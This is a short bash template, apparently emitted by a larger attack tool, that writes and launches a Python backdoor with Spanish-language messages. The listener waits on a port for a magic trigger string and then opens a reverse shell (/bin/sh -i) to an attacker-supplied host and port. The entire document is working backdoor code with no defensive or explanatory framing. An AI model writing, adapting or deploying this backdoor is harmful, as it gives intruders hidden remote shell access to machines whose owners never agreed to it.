#!/bin/bash
SOURCE_FILE="listener_{line}.py"
cat > $SOURCE_FILE <<EOL
import socket
import re
import subprocess 
import os

HOST = '0.0.0.0'  
PORT = {lport}
IP = "{lhost}"
PUERTO = {listener}

especial_cadena = "grisiscomebacksayknokknok"


server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(5)
print(f"Escuchando en el puerto {PORT}...")

def buscar_cadena_especial(data):
    
    if re.search(especial_cadena, data):
        print(f"Cadena especial encontrada: {data}")
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
        s.connect((IP,PUERTO)) 
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(["/bin/sh","-i"])
        
while True:
    
    client_socket, addr = server_socket.accept()
    print(f"Conexión desde {addr}")

    
    request = client_socket.recv(1024)
    if request:
        
        buscar_cadena_especial(request.decode('utf-8'))

    
    client_socket.close()
EOL
python3 $SOURCE_FILE
